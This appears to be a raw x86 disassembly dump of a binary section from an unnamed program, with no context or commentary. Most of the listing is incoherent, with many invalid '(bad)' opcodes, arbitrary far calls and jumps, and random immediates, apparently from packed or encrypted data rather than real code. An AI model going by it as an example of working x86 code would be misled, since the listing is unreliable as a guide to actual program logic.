  4167e0:	mov    DWORD PTR [ebx],ecx
  4167e2:	jae    0x416806
  4167e4:	pop    ds
  4167e5:	lea    edi,[esi+0x7f]
  4167e8:	and    bl,dl
  4167ea:	cdq    
  4167eb:	mov    edi,0x709ba3db
  4167f0:	xchg   edi,eax
  4167f1:	cmp    al,0xa6
  4167f3:	fidiv  WORD PTR gs:[ecx-0x60]
  4167f7:	dec    ebx
  4167f8:	test   BYTE PTR [eax],dh
  4167fa:	push   ds
  4167fb:	rcl    DWORD PTR [edi+0x458b0189],cl
  416801:	clc    
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	add    al,0xf7
  41681a:	scas   eax,DWORD PTR es:[edi]
  41681b:	call   0x7e95:0x787f2376
  416822:	js     0x41689c
  416824:	inc    edx
  416825:	sahf   
  416826:	arpl   bx,cx
  416828:	or     al,0xb6
  41682a:	(bad)  
  41682b:	cmp    DWORD PTR [esi],ebp
  41682d:	(bad)  
  41682e:	mov    edi,0x821d9ecf
  416833:	mov    BYTE PTR [ecx-0x2],ch
  416836:	jl     0x4167c8
  416838:	mov    eax,0xdae63323
  41683d:	sbb    BYTE PTR [ecx+0x93c4d04],dh
  416843:	les    ebx,FWORD PTR [eax-0xa]
  416846:	and    al,0xc9
  416848:	addr16 cmp ah,ch
  41684b:	loope  0x416825
  41684d:	sub    DWORD PTR [ecx],esi
  41684f:	pop    edx
  416850:	outs   dx,BYTE PTR ds:[esi]
  416851:	lods   al,BYTE PTR ds:[esi]
  416852:	adc    esi,DWORD PTR [ecx-0x13]
  416855:	pop    ecx
  416856:	call   0x5064:0xa4187d7b
  41685d:	outs   dx,DWORD PTR ds:[esi]
  41685e:	add    eax,0xbfcb9d1a
  416863:	loope  0x416865
  416865:	push   edx
  416866:	push   edi
  416867:	call   0x40b6bea5
  41686c:	call   0x352f:0xd8889119
  416873:	mov    esp,?
  416875:	push   0xffffffd4
  416877:	push   edi
  416878:	cs retf 0xed38
  41687c:	jge    0x41687e
  41687e:	scas   eax,DWORD PTR es:[edi]
  41687f:	cmp    BYTE PTR [esi+eiz*1],dh
  416882:	add    eax,0x7ea3e76b
  416887:	(bad)  
  416888:	sahf   
  416889:	sbb    BYTE PTR [esp+eax*8-0x59],0xaa
  41688e:	cmc    
  41688f:	cwde   
  416890:	adc    DWORD PTR [edi+ebp*4+0x73],ebp
  416894:	mov    esi,0xad6332d9
  416899:	mov    WORD PTR [ebp-0x56a19a69],es
  41689f:	adc    eax,0x52e65537
  4168a4:	jmp    0xc679:0xaa8683e6
  4168ab:	xchg   esi,eax
  4168ac:	dec    edx
  4168ad:	push   0xa9dacdde
  4168b2:	or     eax,0xd53220f2
  4168b7:	pop    ds
  4168b8:	cmp    BYTE PTR [esi-0x742bdc6c],ch
  4168be:	jbe    0x41686a
  4168c0:	jge    0x41684e
  4168c2:	stc    
  4168c3:	mov    dh,0x1a
  4168c5:	sbb    dh,BYTE PTR [ecx+0x68dadedd]
  4168cb:	(bad)  
  4168cc:	add    eax,esi
  4168ce:	sub    eax,0xc29f91e4
  4168d3:	jge    0x41685e
  4168d5:	adc    eax,0x35828207
  4168da:	daa    
  4168db:	out    0x16,al
  4168dd:	call   0xf6b0:0x3d2ff8bc
  4168e4:	cwde   
  4168e5:	add    edx,0x34
  4168e8:	out    dx,eax
  4168e9:	inc    esi
  4168ea:	pop    esi
  4168eb:	sub    ecx,ebx
  4168ed:	push   ds
  4168ee:	fidivr DWORD PTR [edx-0x4952d365]
  4168f4:	dec    esi
  4168f5:	outs   dx,DWORD PTR ds:[esi]
  4168f6:	fistp  DWORD PTR [eax+ecx*4+0x18]
  4168fa:	pop    ebp
  4168fb:	cli    
  4168fc:	adc    eax,0x33ba22ac
  416901:	loopne 0x416914
  416903:	pop    es
  416904:	jo     0x416961
  416906:	pop    esi
  416907:	bound  edi,QWORD PTR [edi+0x733b25d]
  41690d:	push   esp
  41690e:	add    esp,ebp
  416910:	push   ebx
  416911:	sbb    edi,edi
  416913:	jnp    0x4168c2
  416915:	lock cmp bl,BYTE PTR [esi-0x457680db]
  41691c:	das    
  41691d:	jns    0x416997
  41691f:	ds (bad) 
  416921:	into   
  416922:	sbb    al,0xa3
  416924:	xchg   edi,eax
  416925:	test   eax,0x4672446e
  41692a:	add    DWORD PTR [ebx+0x4b],edx
  41692d:	out    0xc4,al
  41692f:	cmp    ch,dl
  416931:	jb     0x416987
  416933:	test   eax,0x9fe8f18b
  416938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416939:	push   0x5a
  41693b:	cs pop esi
  41693d:	rcl    BYTE PTR [eax-0x6cbe0bd4],cl
  416943:	dec    ecx
  416944:	pushf  
  416945:	daa    
  416946:	xor    ebx,DWORD PTR [eax+0x2f]
  416949:	int    0xe0
  41694b:	adc    eax,0x1ec58fd7
  416950:	rcr    BYTE PTR [esi-0x68bf3b53],0x57
  416957:	jne    0x416903
  416959:	fistp  WORD PTR [ebx]
  41695b:	jb     0x4169d3
  41695d:	rcr    dh,0x8b
  416960:	jmp    FWORD PTR [edi+0x264f411b]
  416966:	(bad)  
  416968:	retf   
  416969:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41696b:	fwait
  41696c:	shl    BYTE PTR [ecx-0x3abeedea],1
  416972:	push   ds
  416973:	pop    ebp
  416974:	(bad)  
  416975:	in     al,0x97
  416977:	jns    0x4168fb
  416979:	loopne 0x4169df
  41697b:	in     al,dx
  41697c:	mov    DWORD PTR ds:0xde6f77c0,edx
  416982:	inc    edx
  416983:	mov    ah,0x92
  416985:	int    0xc8
  416987:	std    
  416988:	data16 (bad) 
  41698a:	sub    al,0x3d
  41698c:	push   0xffffffed
  41698e:	dec    eax
  41698f:	xchg   ecx,eax
  416990:	sbb    ebx,DWORD PTR [edi]
  416992:	push   esi
  416993:	xor    ebp,DWORD PTR ds:0x2ea261d4
  416999:	lds    ebx,FWORD PTR [ecx-0x79]
  41699c:	jle    0x416a06
  41699e:	arpl   WORD PTR [edx-0x7a],si
  4169a1:	(bad)  
  4169a2:	sbb    DWORD PTR [eax+0x1b],ecx
  4169a5:	in     al,0x25
  4169a7:	push   ecx
  4169a8:	and    eax,0x924e0437
  4169ad:	jl     0x4169eb
  4169af:	mov    cl,0x8b
  4169b1:	pop    ss
  4169b2:	test   DWORD PTR [ecx+0x12],eax
  4169b5:	jp     0x4169d8
  4169b7:	adc    DWORD PTR [edx+0x44],ebx
  4169ba:	and    DWORD PTR [ebx+0x24],0x2019f64e
  4169c1:	dec    edx
  4169c2:	inc    ebx
  4169c3:	data16 (bad) 
  4169c5:	jmp    0x416a11
  4169c7:	call   0xa788:0xc3912572
  4169ce:	xchg   dl,bh
  4169d0:	mov    esp,0x62a39e91
  4169d5:	psubusw mm6,mm6
  4169d8:	and    DWORD PTR [ecx+0x5d],esp
  4169db:	sub    al,0xee
  4169dd:	push   DWORD PTR [eax]
  4169df:	retf   0xf70d
  4169e2:	push   esi
  4169e3:	mov    BYTE PTR [ecx-0x2e],bl
  4169e6:	lods   al,BYTE PTR ds:[esi]
  4169e7:	pop    esi
  4169e8:	xor    al,0x6c
  4169ea:	push   eax
  4169eb:	loopne 0x416a11
  4169ed:	cmp    BYTE PTR [ebx-0x2517226c],ah
  4169f3:	cmp    DWORD PTR ds:0xa7efabd8,eax
  4169f9:	cmc    
  4169fa:	adc    DWORD PTR [ebp+0x7],0xffffffd1
  4169fe:	not    DWORD PTR [esi-0x26bd402c]
  416a04:	or     edi,DWORD PTR [eax+0x64a99dee]
  416a0a:	nop
  416a0b:	pusha  
  416a0c:	mov    al,ds:0xeb76dff9
  416a11:	push   ecx
  416a12:	js     0xfa0822d
  416a18:	xor    BYTE PTR [esi+0x15],0x6e
  416a1c:	pop    esp
  416a1d:	push   ebp
  416a1e:	push   eax
  416a1f:	jnp    0x416a01
  416a21:	js     0x4169cc
  416a23:	fsubr  st,st(5)
  416a25:	loopne 0x4169c1
  416a27:	adc    DWORD PTR [edx+ecx*1-0x2ef3a7f1],esi
  416a2e:	or     al,ch
  416a30:	loope  0x4169d9
  416a32:	call   0x3167:0x1e69a404
  416a39:	sub    bh,ch
  416a3b:	rcl    ebp,cl
  416a3d:	xor    BYTE PTR [ecx-0x4d],bh
  416a40:	jb     0x416a50
  416a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a43:	int    0x33
  416a45:	sbb    ch,BYTE PTR [edi]
  416a47:	mov    ebp,0x9dc3b816
  416a4c:	xchg   esi,eax
  416a4d:	mov    BYTE PTR ds:0x268dc2d0,bl
  416a53:	scas   eax,DWORD PTR es:[edi]
  416a54:	(bad)  
  416a55:	jae    0x4169f5
  416a57:	push   esi
  416a58:	rol    DWORD PTR [edi-0x6c],1
  416a5b:	mov    dl,0x15
  416a5d:	dec    esp
  416a5e:	push   ds
  416a5f:	pop    ds
  416a60:	inc    esi
  416a61:	mov    esp,0xb6d18f6e
  416a66:	dec    ebx
  416a67:	imul   ebp,esi,0x65
  416a6a:	(bad)  
  416a6b:	pop    edi
  416a6c:	aad    0x6
  416a6e:	xchg   DWORD PTR [eax],esp
  416a70:	mov    al,0x71
  416a72:	repnz neg DWORD PTR [ebx+eax*8-0x39d34204]
  416a7a:	ret    0xad97
  416a7d:	stos   DWORD PTR es:[edi],eax
  416a7e:	sbb    ebx,DWORD PTR [ebp+eax*1-0xe75a5ab]
  416a85:	(bad)  
  416a86:	cli    
  416a87:	rcr    DWORD PTR [ebx],cl
  416a89:	sub    eax,0x9304f0ce
  416a8e:	and    al,0x40
  416a90:	push   ecx
  416a91:	pushf  
  416a92:	mov    ds:0x86f8c97b,eax
  416a97:	mov    bh,BYTE PTR ds:0x1fccd3f2
  416a9d:	fs mov bl,0x66
  416aa0:	lock or edx,edx
  416aa3:	jge    0x416ae0
  416aa5:	aaa    
  416aa6:	xchg   esp,eax
  416aa7:	mov    ds:0xf806f392,eax
  416aac:	addr16 (bad) 
  416aae:	cld    
  416aaf:	xchg   edx,eax
  416ab0:	arpl   dx,ax
  416ab2:	fstp   DWORD PTR [ebx+0x5f]
  416ab5:	pop    esp
  416ab6:	mov    bh,0xe4
  416ab8:	dec    eax
  416ab9:	xchg   esp,eax
  416aba:	repz xor eax,DWORD PTR [ebx+0x458b8c47]
  416ac1:	cld    
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0xce64ff75
  416ad4:	pop    es
  416ad5:	pop    edi
  416ad6:	adc    dl,BYTE PTR [ebx-0x6a8780e0]
  416adc:	jle    0x416b56
  416ade:	js     0x416afc
  416ae0:	add    DWORD PTR ds:0x7ff2c92f,0xffffff99
  416ae7:	and    eax,0x56ff894e
  416aec:	scas   eax,DWORD PTR es:[edi]
  416aed:	mov    edi,0x9f1e08c
  416af2:	(bad)  
  416af4:	xchg   ecx,eax
  416af5:	in     eax,dx
  416af6:	mov    DWORD PTR [esi+eax*1],edi
  416af9:	mov    dh,0xe9
  416afb:	scas   al,BYTE PTR es:[edi]
  416afc:	jle    0x416aa0
  416afe:	repnz out 0xba,al
  416b01:	mov    bl,0xad
  416b03:	xor    BYTE PTR [esi-0x34],ah
  416b06:	mov    al,ds:0xa9d29bc7
  416b0b:	mov    ebx,0x459a71d1
  416b10:	mov    esp,0x490de062
  416b15:	add    DWORD PTR [ecx-0x47393b88],ebp
  416b1b:	xor    ah,dl
  416b1d:	or     eax,0xf9fa4f1b
  416b22:	ficomp DWORD PTR [ecx]
  416b24:	fisttp DWORD PTR [eax]
  416b26:	(bad)  
  416b27:	jns    0x416ac8
  416b29:	jge    0x416ade
  416b2b:	xchg   edi,eax
  416b2c:	repz (bad) 
  416b2e:	fcomip st,st(0)
  416b30:	inc    ebp
  416b31:	test   al,0x30
  416b33:	ror    DWORD PTR [esi+0x7b732111],0xf
  416b3a:	out    dx,al
  416b3b:	xchg   edx,eax
  416b3c:	jno    0x416b30
  416b3e:	hlt    
  416b3f:	(bad)  
  416b40:	jbe    0x416b33
  416b42:	and    cl,BYTE PTR [eax]
  416b44:	(bad)  
  416b45:	or     eax,0xca926d4e
  416b4a:	mov    DWORD PTR [esi+edx*8],esi
  416b4d:	push   edx
  416b4e:	sahf   
  416b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b50:	inc    edi
  416b51:	mov    ds:0xf0776edd,eax
  416b56:	(bad)  [edi-0x64233a5c]
  416b5c:	rol    BYTE PTR [eax+ebp*1],0x40
  416b60:	mov    ebp,0x421157c5
  416b65:	xor    bh,BYTE PTR es:[eax+0x14]
  416b69:	inc    edi
  416b6a:	fdivr  DWORD PTR [edi-0x7a391c30]
  416b70:	inc    ecx
  416b71:	call   FWORD PTR [esi+0x39]
  416b74:	out    0xc2,al
  416b76:	sub    eax,0xfcbd933d
  416b7b:	or     BYTE PTR [eax+0x73],bl
  416b7e:	stc    
  416b7f:	jl     0x416b38
  416b81:	outs   dx,DWORD PTR ds:[esi]
  416b82:	icebp  
  416b83:	sub    al,0x2c
  416b85:	xor    DWORD PTR [edx],0xffffff9e
  416b88:	test   BYTE PTR [eax+0x43],0xcb
  416b8c:	mov    esp,0xdfdc4cb1
  416b91:	in     eax,0x4a
  416b93:	pop    edx
  416b94:	pop    esp
  416b95:	test   BYTE PTR [edi+0x6bc9a0b6],0x24
  416b9c:	aaa    
  416b9d:	fimul  DWORD PTR [esi+0x684c23b0]
  416ba3:	jmp    0xe732:0xe2a0d2ac
  416baa:	pop    esi
  416bab:	fcomp  QWORD PTR [esp+esi*4+0x1870945b]
  416bb2:	adc    al,0x2e
  416bb4:	ins    DWORD PTR es:[edi],dx
  416bb5:	outs   dx,BYTE PTR ds:[esi]
  416bb6:	fisttp DWORD PTR [ebx]
  416bb8:	fs mov cl,0x16
  416bbb:	jle    0x416bef
  416bbd:	jmp    0x8b652fef
  416bc2:	sub    edi,0x3383fe73
  416bc8:	push   ebx
  416bc9:	dec    edi
  416bca:	lods   eax,DWORD PTR ds:[esi]
  416bcb:	sbb    esi,esi
  416bcd:	add    eax,0x57f9e457
  416bd2:	xchg   edi,eax
  416bd3:	dec    edx
  416bd4:	jle    0x416bcb
  416bd6:	sbb    BYTE PTR [ecx-0x23da2c57],dh
  416bdc:	mov    esi,0x3cf67389
  416be1:	add    cl,dl
  416be3:	inc    ecx
  416be4:	dec    ecx
  416be5:	push   esi
  416be6:	or     ch,BYTE PTR [ecx-0x6e]
  416be9:	jb     0x416c48
  416beb:	mov    ds:0xb9bbd5f4,al
  416bf0:	push   esp
  416bf1:	inc    eax
  416bf2:	sbb    esp,0xffffffdb
  416bf5:	(bad)  
  416bf6:	xchg   ecx,eax
  416bf7:	xsha1  (bad)
  416bf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bf9:	retf   0xd63c
  416bfc:	fadd   DWORD PTR [edi-0x60f51538]
  416c02:	dec    ebp
  416c03:	or     al,BYTE PTR [ebx-0x78]
  416c06:	mov    BYTE PTR [edx],cl
  416c08:	fwait
  416c09:	test   eax,0xd8992ce4
  416c0e:	nop
  416c0f:	pop    ss
  416c10:	ud2    
  416c12:	(bad)  
  416c14:	lahf   
  416c15:	and    DWORD PTR [edx+0xf96b167],eax
  416c1b:	inc    edx
  416c1c:	xor    al,0x14
  416c1e:	ffree  st(2)
  416c20:	in     al,0xe2
  416c22:	xor    al,0x9c
  416c24:	pop    eax
  416c25:	mov    eax,ds:0x631a940f
  416c2a:	and    BYTE PTR [ebp+0x16f067c9],al
  416c30:	mov    ecx,0xfe53e800
  416c35:	gs cwd 
  416c38:	pop    ebp
  416c39:	mov    edx,0xcceab57e
  416c3e:	cmp    BYTE PTR [esp+eiz*4+0x4d],ah
  416c42:	jno    0x416ca6
  416c44:	xchg   ecx,eax
  416c45:	xor    eax,0x974697bf
  416c4a:	les    esi,FWORD PTR [ecx-0x29]
  416c4d:	jl     0x416c5f
  416c4f:	scas   eax,DWORD PTR es:[edi]
  416c50:	ins    DWORD PTR es:[edi],dx
  416c51:	jnp    0x416c72
  416c53:	shl    DWORD PTR [edx+esi*1-0x41],cl
  416c57:	mov    BYTE PTR [edx-0x1d],ah
  416c5a:	xchg   edi,eax
  416c5b:	icebp  
  416c5c:	jnp    0x416c4c
  416c5e:	ud1    ebx,DWORD PTR [esi-0x7b]
  416c62:	mov    esi,0x6db03dfd
  416c67:	(bad)  
  416c68:	(bad)  
  416c69:	mov    esp,0x7574a135
  416c6e:	pop    ecx
  416c6f:	mov    ebx,es
  416c71:	xchg   esp,eax
  416c72:	lahf   
  416c73:	cmp    ah,BYTE PTR [edx-0x15]
  416c76:	adc    al,0x3
  416c78:	push   ss
  416c79:	push   0xffffffe9
  416c7b:	stc    
  416c7c:	hlt    
  416c7d:	dec    edx
  416c7e:	es inc ebx
  416c80:	jns    0x416c7b
  416c82:	icebp  
  416c83:	sub    al,0x52
  416c85:	dec    ecx
  416c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c87:	sti    
  416c88:	or     eax,0x2992b1eb
  416c8d:	js     0x416c81
  416c8f:	add    ecx,DWORD PTR gs:[ebp+0x64a86eba]
  416c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c97:	cmp    eax,0x86896f52
  416c9c:	ja     0x416c31
  416c9e:	dec    esp
  416c9f:	cdq    
  416ca0:	daa    
  416ca1:	imul   ebx,eax,0x5ca77579
  416ca7:	dec    esi
  416ca8:	in     al,dx
  416ca9:	out    dx,eax
  416caa:	rcr    BYTE PTR [ebx+0x51],cl
  416cad:	out    0xe2,al
  416caf:	nop
  416cb0:	pop    ds
  416cb1:	enter  0xe940,0x57
  416cb5:	xchg   bh,dl
  416cb7:	std    
  416cb8:	(bad)  
  416cb9:	mov    edx,0xaf590136
  416cbe:	nop
  416cbf:	add    edx,DWORD PTR [eax-0x2b]
  416cc2:	cmp    eax,0xf6a26f43
  416cc7:	pusha  
  416cc8:	and    DWORD PTR [ecx],0x4be8a1f9
  416cce:	xor    BYTE PTR [ebx],dh
  416cd0:	dec    esp
  416cd1:	and    ah,cl
  416cd3:	pop    ss
  416cd4:	ins    DWORD PTR es:[edi],dx
  416cd5:	(bad)  
  416cd6:	not    al
  416cd8:	cmp    eax,0xac72aa44
  416cdd:	sub    esi,DWORD PTR [esi+ecx*8]
  416ce0:	cmp    DWORD PTR [edi],edx
  416ce2:	ret    0x3597
  416ce5:	push   edi
  416ce6:	int    0x89
  416ce8:	jbe    0x83ef7751
  416cee:	in     al,dx
  416cef:	ror    BYTE PTR [eax+0x3d468494],0x2c
  416cf6:	pop    esp
  416cf7:	cwde   
  416cf8:	adc    bl,al
  416cfa:	jg     0x416cf1
  416cfc:	inc    esp
  416cfd:	nop
  416cfe:	aaa    
  416cff:	pop    esp
  416d00:	mov    eax,ds:0xdf44e2c8
  416d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d06:	fadd   DWORD PTR [bp-0x3db4]
  416d0b:	ret    0x9430
  416d0e:	mov    esp,0xcbef79e0
  416d13:	fwait
  416d14:	out    0xb2,eax
  416d16:	mov    DWORD PTR [esi+0xc],0xa2b43917
  416d1d:	xchg   ebp,eax
  416d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d1f:	mov    ebx,0xc1e04062
  416d24:	out    dx,eax
  416d25:	pop    es
  416d26:	ret    
  416d27:	add    DWORD PTR es:[eax+0x2238585b],ebp
  416d2e:	enter  0x8f36,0xf0
  416d32:	mov    ebp,0x736ddd24
  416d37:	sub    DWORD PTR [eax-0x7f],esp
  416d3a:	mov    dl,0x40
  416d3c:	test   al,0xc4
  416d3e:	mov    ah,0xfd
  416d40:	jmp    0x243b2eed
  416d45:	test   BYTE PTR [ecx],dl
  416d47:	fst    DWORD PTR [ecx]
  416d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d4a:	adc    esi,0xffffffb1
  416d4d:	popf   
  416d4e:	inc    ebx
  416d4f:	cvtps2pi mm5,QWORD PTR [eax+0x41864fb1]
  416d56:	out    0xa1,eax
  416d58:	hlt    
  416d59:	xor    BYTE PTR [eax+edi*4],0x47
  416d5d:	inc    eax
  416d5e:	dec    esi
  416d5f:	cs ret 
  416d61:	xchg   edi,eax
  416d62:	ret    0xf1c3
  416d65:	ins    DWORD PTR es:[edi],dx
  416d66:	(bad)  
  416d67:	(bad)  [ebx]
  416d69:	pop    edi
  416d6a:	push   ss
  416d6b:	cmp    al,0xb6
  416d6d:	ds push esp
  416d6f:	es xor eax,0xaa2f5f19
  416d75:	dec    edx
  416d76:	dec    esp
  416d77:	mov    ebx,0x4d8b30e8
  416d7c:	adc    BYTE PTR [ebx],dh
  416d7e:	mov    DWORD PTR [ebx],0xfc13bc6
  416d84:	test   DWORD PTR [ebx-0x74fffffb],edx
  416d8a:	inc    ebp
  416d8b:	cld    
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0x8609:0x915a1efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	jno    0x416d6b
  416db9:	iret   
  416dba:	push   ebp
  416dbb:	dec    ebx
  416dbc:	(bad)  
  416dbd:	jl     0x416df2
  416dbf:	push   0xbf40e7c1
  416dc4:	fcmovnb st,st(4)
  416dc6:	sub    al,0x85
  416dc8:	sub    al,0x6d
  416dca:	mov    edx,DWORD PTR [edi]
  416dcc:	sbb    al,0x69
  416dce:	and    DWORD PTR [esi+0x19],ebp
  416dd1:	add    al,0x13
  416dd3:	test   BYTE PTR [ebp+0x15a8e2b9],ah
  416dd9:	lock ret 
  416ddb:	sbb    DWORD PTR ss:[ecx+0x60],ebx
  416ddf:	inc    edx
  416de0:	mov    ecx,0x17be0625
  416de5:	sbb    ecx,DWORD PTR [eax+0x74b49831]
  416deb:	jl     0x416e5a
  416ded:	jmp    0x997e:0x2acc75c2
  416df4:	mov    esi,0xde92a359
  416df9:	jno    0x416da8
  416dfb:	ja     0x416e25
  416dfd:	add    al,0x73
  416dff:	jmp    0xdc912dd7
  416e04:	adc    ch,dl
  416e06:	idiv   BYTE PTR [edi-0x651fe83]
  416e0c:	dec    esi
  416e0d:	and    esp,DWORD PTR [edi]
  416e0f:	sub    BYTE PTR [edi-0x3f],ah
  416e12:	push   es
  416e13:	(bad)  
  416e14:	out    dx,eax
  416e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e16:	mov    cl,0x59
  416e18:	dec    eax
  416e19:	cld    
  416e1a:	pop    edi
  416e1b:	shl    DWORD PTR [edx],cl
  416e1d:	popa   
  416e1e:	loop   0x416e4e
  416e20:	xlat   BYTE PTR ds:[ebx]
  416e21:	pusha  
  416e22:	(bad)  
  416e23:	xchg   esi,eax
  416e24:	push   ss
  416e25:	fidiv  DWORD PTR [esi-0x69]
  416e28:	call   0xd37418f7
  416e2d:	int    0x22
  416e2f:	xor    al,0x69
  416e31:	retf   
  416e32:	or     edi,DWORD PTR [edi+0x10]
  416e35:	call   0x7c34:0x2fcda44d
  416e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e3d:	popf   
  416e3e:	xlat   BYTE PTR ds:[ebx]
  416e3f:	in     eax,dx
  416e40:	mov    bl,0x0
  416e42:	ror    edi,cl
  416e44:	pcmpgtb mm1,QWORD PTR [ebp+0x368effa3]
  416e4b:	loopne 0x416e38
  416e4d:	les    esi,FWORD PTR [ebx+eiz*1-0x76f74373]
  416e54:	dec    edx
  416e55:	mov    eax,ds:0x24ee7af8
  416e5a:	and    al,0xd2
  416e5c:	nop
  416e5d:	sar    BYTE PTR [ebx+0x7a],0x18
  416e61:	cmp    ecx,eax
  416e63:	adc    DWORD PTR [ebp+0x53],esp
  416e66:	add    al,0x26
  416e68:	in     eax,0xe1
  416e6a:	pop    ebp
  416e6b:	shr    DWORD PTR [esp+eiz*2],cl
  416e6e:	mov    dh,0xee
  416e70:	aad    0x68
  416e72:	cmp    edx,esp
  416e74:	xor    DWORD PTR [ebx],0x465744a4
  416e7a:	cmp    eax,0x37aa112c
  416e7f:	sub    ecx,DWORD PTR ds:[ebx+0x68]
  416e83:	dec    esp
  416e84:	add    eax,0xed2dd63
  416e89:	nop
  416e8a:	mov    dh,0xf5
  416e8c:	xor    DWORD PTR [esi+0x28],ebp
  416e8f:	mov    eax,ds:0xab5fb32e
  416e94:	or     eax,0xce92069d
  416e99:	xor    DWORD PTR [ecx-0x2771c6e9],edx
  416e9f:	mov    DWORD PTR [edi-0x3d],0xfb168518
  416ea6:	ins    DWORD PTR es:[edi],dx
  416ea7:	mov    WORD PTR [edx+0x48],ds
  416eaa:	fdiv   QWORD PTR [eax+0x426c595a]
  416eb0:	mov    fs,WORD PTR [ecx+0x496a90c0]
  416eb6:	(bad)  
  416eb7:	mov    ah,0xb9
  416eb9:	sbb    al,0xfa
  416ebb:	addr16 das 
  416ebd:	pop    ds
  416ebe:	jecxz  0x416edd
  416ec0:	cdq    
  416ec1:	sbb    DWORD PTR [edx+0x31edbff2],esi
  416ec7:	arpl   cx,ax
  416ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416eca:	ds cs adc al,0x94
  416ece:	dec    edi
  416ecf:	cmp    BYTE PTR [esi-0x4],0x57
  416ed3:	fisub  WORD PTR [ebx-0x2e7946c4]
  416ed9:	mov    esp,0x38c13b25
  416ede:	mov    al,0x66
  416ee0:	addr16 inc esi
  416ee2:	mov    dh,0x4b
  416ee4:	push   ss
  416ee5:	adc    al,0x5
  416ee7:	imul   eax,ebx,0xaa3055d2
  416eed:	push   ecx
  416eee:	or     eax,DWORD PTR [eax-0x30aa041a]
  416ef4:	jae    0x416eb3
  416ef6:	fisttp QWORD PTR [esi-0x74]
  416ef9:	hlt    
  416efa:	fisttp WORD PTR [esi]
  416efc:	sbb    eax,0xe6386384
  416f01:	xor    eax,0x4b172541
  416f06:	mov    ah,0x84
  416f08:	sbb    ebx,DWORD PTR [eax+0x13]
  416f0b:	xor    DWORD PTR [ebp-0x21a13a2b],esp
  416f11:	and    BYTE PTR [esi-0x76],ch
  416f14:	pop    eax
  416f15:	xchg   ebp,eax
  416f16:	add    ecx,DWORD PTR [ebp-0x19d6b182]
  416f1c:	out    dx,eax
  416f1d:	push   ecx
  416f1e:	inc    esi
  416f1f:	ror    eax,1
  416f21:	out    dx,al
  416f22:	lods   eax,DWORD PTR ds:[esi]
  416f23:	stos   BYTE PTR es:[edi],al
  416f24:	add    bh,ch
  416f26:	push   esp
  416f27:	and    al,0xe3
  416f29:	pop    ss
  416f2a:	fisub  WORD PTR [ebx+0x4f]
  416f2d:	dec    edi
  416f2f:	daa    
  416f30:	inc    edx
  416f31:	loop   0x416fb1
  416f33:	call   0xd626:0x11f6b409
  416f3a:	jbe    0x416edc
  416f3c:	pop    eax
  416f3d:	adc    al,0xad
  416f3f:	sub    BYTE PTR [edx-0x1e],ah
  416f42:	dec    ecx
  416f43:	sub    dl,0x20
  416f46:	rcl    BYTE PTR [edi+0x23c01c81],0x3a
  416f4d:	jne    0x416f02
  416f4f:	sub    ax,0x8b75
  416f53:	sub    edx,DWORD PTR [edi]
  416f55:	sbb    BYTE PTR [ecx-0x137fb5fd],bh
  416f5b:	shr    BYTE PTR [ebx+0x79018679],cl
  416f61:	outs   dx,DWORD PTR ds:[esi]
  416f62:	call   0x3db:0x6d77c15b
  416f69:	cmp    DWORD PTR [ecx],edx
  416f6b:	test   DWORD PTR [edi-0x6],eax
  416f6e:	fmulp  st(1),st
  416f70:	into   
  416f71:	or     eax,0xc7b73081
  416f76:	or     ch,BYTE PTR [edi]
  416f78:	fist   WORD PTR [edi+0xfa815b6]
  416f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f7f:	add    BYTE PTR [edx-0x154ef4c5],bl
  416f85:	les    ebx,FWORD PTR [ecx]
  416f87:	out    0x21,eax
  416f89:	mov    ebp,0xe6e9bbfd
  416f8e:	dec    ebp
  416f8f:	in     eax,dx
  416f90:	dec    eax
  416f91:	push   esp
  416f92:	cmp    al,0xa2
  416f94:	jl     0x416f2e
  416f96:	xchg   BYTE PTR [eax-0x795af7b9],ah
  416f9c:	mov    ecx,0x4016ef5e
  416fa1:	add    al,0x7
  416fa3:	adc    DWORD PTR [edx+eax*2+0x22cd478],ecx
  416faa:	sbb    edx,DWORD PTR [esi+0x244d009c]
  416fb0:	sbb    bh,BYTE PTR [ecx+0x7952350f]
  416fb6:	adc    DWORD PTR [ebp-0x36e65f32],esi
  416fbc:	sub    ch,BYTE PTR [esi+ecx*8]
  416fbf:	jb     0x41703c
  416fc1:	sbb    DWORD PTR [edi+0x4604113d],ecx
  416fc7:	inc    edi
  416fc8:	sub    eax,DWORD PTR [edx+0x21]
  416fcb:	mov    ds:0x1787b312,eax
  416fd0:	iret   
  416fd1:	mov    ecx,0xdee3eda9
  416fd6:	inc    ebp
  416fd7:	jg     0x416f72
  416fd9:	pop    ecx
  416fda:	pop    edi
  416fdb:	mov    edx,ebp
  416fdd:	cs sub bh,0xd3
  416fe1:	adc    dl,BYTE PTR [edi-0x2f]
